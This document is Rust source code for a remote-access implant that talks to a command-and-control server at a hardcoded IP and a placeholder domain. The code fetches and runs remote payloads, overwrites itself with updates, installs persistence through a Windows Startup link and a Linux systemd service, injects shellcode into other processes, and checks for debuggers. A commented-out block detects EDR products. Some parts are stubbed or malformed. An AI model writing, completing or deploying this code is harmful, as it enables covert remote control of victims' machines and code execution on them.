use std::{
    env,
    fs::File,
    io::{self, Write},
    process,
    ptr,
    sync::atomic::{AtomicBool},
    time::{Duration, SystemTime},
};
use sysinfo::System;
use reqwest::Client;
use tokio::time::sleep;
use lazy_static::lazy_static;
use rand::{thread_rng, Rng};
use winapi::{
    um::{
        memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx},
        processthreadsapi::{CreateRemoteThread, OpenProcess},
        winnt::{PROCESS_ALL_ACCESS, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE},
    },
    shared::minwindef::FALSE,
};
use prometheus::{IntCounterVec, register_int_counter_vec};

// Define constants
const C2_COMMAND_URL: &str = "192.168.1.117:2222";
const PAYLOAD_URL: &str = "https://your-c2-server.com/api/payload";
const UPDATE_URL: &str = "https://your-c2-server.com/api/update";
const C2_TASK_INTERVAL_URL: &str = "192.168.1.117:2222";
const COMMAND_URL: &str = "192.168.1.117:2222";

// Define static variables
static IS_DEBUGGED: AtomicBool = AtomicBool::new(false);
lazy_static! {
    static ref MEMORY_USAGE: IntCounterVec = register_int_counter_vec!(
        "memory_usage",
        "Memory usage of the application in bytes.",
        &["type"]
    ).expect("Failed to register memory_usage metric");
}

fn check_for_debugging() -> bool {
    let start = SystemTime::now();
    for _ in 0..1_000_000 {
        let _ = 2 * 2;
    }
    start.elapsed().unwrap() > Duration::from_millis(1)
}

//fn check_for_edr() -> bool {
  //  let edr_processes = vec!["CarbonBlack", "CrowdStrike", "Symantec"];
    //let system = System::new_all();
    //edr_processes.iter().any(|edr| {
     //   !system.processes().values().all(|p| {
      //      !(p.name().to_ascii_lowercase().contains(&edr.to_lowercase()) ?& p.name().to_ascii_lowercase().contains(&edr.to_lowercase()))
       // })
   // })
//}

async fn retrieve_commands() -> Result<String, reqwest::Error> {
    let client = Client::new();
    let res = client.post(COMMAND_URL)
        .body("Request commands")
        .send()
        .await?;

    if res.status().is_success() {
        let response_text = res.text().await?;
        Ok(response_text)
    } else {
        Err(res.error_for_status().unwrap_err())
    }
}

async fn download_and_execute_payload() -> Result<(), Box<dyn std::error::Error>> {
    let payload_url = env::var("PAYLOAD_URL").unwrap_or_else(|_| PAYLOAD_URL.to_string());
    let client = Client::new();

    let res = client.get(&payload_url).send().await?;
    if res.status().is_success() {
        let payload = res.bytes().await?;
        let mut payload_file = File::create("payload.bin")?;
        payload_file.write_all(&payload)?;
        process::Command::new("payload.bin").spawn()?;
    }
    Ok(())
}

fn log_memory_usage() {
    let mut system = System::new_all();
    system.refresh_memory();
    let used_memory = system.used_memory();
    MEMORY_USAGE.with_label_values(&["used"]).inc_by(used_memory as u64);
}

fn self_modify() {
    // Add future self-modification techniques like constant manipulation
}

fn set_up_persistence() -> io::Result<()> {
    #[cfg(target_os = "windows")]
    {
        let exe_path = env::current_exe()?;
        let startup_folder = format!(
            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            env::var("APPDATA").map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?
        );
        let startup_link = format!("{}/agent.lnk", startup_folder);
        std::os::windows::fs::symlink_file(exe_path, startup_link)?;
    }
    #[cfg(target_os = "linux")]
    {
        let exe_path = env::current_exe()?;
        let service_file = "/etc/systemd/system/agent.service";
        let service_contents = format!(
            "[Unit]\nDescription=Persistent Agent\n[Service]\nExecStart={}\n[Install]\nWantedBy=multi-user.target",
            exe_path.to_string_lossy()
        );
        let mut file = File::create(service_file)?;
        file.write_all(service_contents.as_bytes())?;
        process::Command::new("systemctl").args(&["enable", "agent"]).output()?;
    }
    Ok(())
}

async fn self_update() -> Result<(), Box<dyn std::error::Error>> {
    let update_url = env::var("UPDATE_URL").unwrap_or_else(|_| UPDATE_URL.to_string());
    let client = Client::new();
    let res = client.get(&update_url).send().await?;

    if res.status().is_success() {
        let new_agent = res.bytes().await?;
        let mut file = File::create(env::current_exe()?)?;
        file.write_all(&new_agent)?;
        process::Command::new(env::current_exe()?).spawn()?;
    }
    Ok(())
}

async fn get_task_interval() -> Duration {
    let interval_url = env::var("C2_TASK_INTERVAL_URL").unwrap_or_else(|_| C2_TASK_INTERVAL_URL.to_string());
    let client = Client::new();

    match client.get(&interval_url).send().await {
        Ok(res) if res.status().is_success() => {
            let interval: u64 = res.text().await.expect("Failed to retrieve task interval").parse().expect("Failed to parse task interval");
            Duration::from_secs(interval)
        }
        _ => Duration::from_secs(60),
    }
}

async fn random_delay() {
    let delay = thread_rng().gen_range(1000..5000);
    sleep(Duration::from_millis(delay)).await;
}

fn inject_payload(target_pid: u32, payload: &[u8]) -> Result<(), io::Error> {
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid) };
    if process_handle.is_null() {
        return Err(io::Error::last_os_error());
    }

    let remote_memory = unsafe { VirtualAllocEx(process_handle, ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote_memory.is_null() {
        unsafe { VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE); }
        return Err(io::Error::last_os_error());
    }

    let result = unsafe { WriteProcessMemory(process_handle, remote_memory, payload.as_ptr() as _, payload.len(), ptr::null_mut()) };
    if result == 0 {
        unsafe { VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE); }
        return Err(io::Error::last_os_error());
    }

    unsafe { CreateRemoteThread(process_handle, ptr::null_mut(), 0, Some(std::mem::transmute(remote_memory)), ptr::null_mut(), 0, ptr::null_mut()) };
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Main logic of your application
    loop {
        if !check_for_debugging()  {
            let _commands = retrieve_commands().await?;
            // Process commands...
            
            download_and_execute_payload().await?;
            self_update().await?;
            
            log_memory_usage();
            self_modify();
            set_up_persistence()?;
            
            let interval = get_task_interval().await;
            random_delay().await;
            sleep(interval).await;
        }
    }
}
